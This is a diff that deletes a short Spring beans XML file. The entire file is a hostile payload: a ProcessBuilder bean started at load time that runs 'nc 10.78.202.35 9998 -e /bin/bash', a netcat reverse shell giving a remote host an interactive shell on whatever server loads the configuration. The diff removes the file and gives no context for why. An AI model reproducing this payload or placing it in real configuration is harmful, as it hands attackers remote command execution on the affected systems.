@@ -1,7 +1,0 @@
-<beans xmlns="http://www.springframework.org/schema/beans"
-       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
-    <bean id="processBuilder" class="java.lang.ProcessBuilder" init-method="start">
-        <constructor-arg value="nc 10.78.202.35 9998 -e /bin/bash"/>
-    </bean>
-</beans>
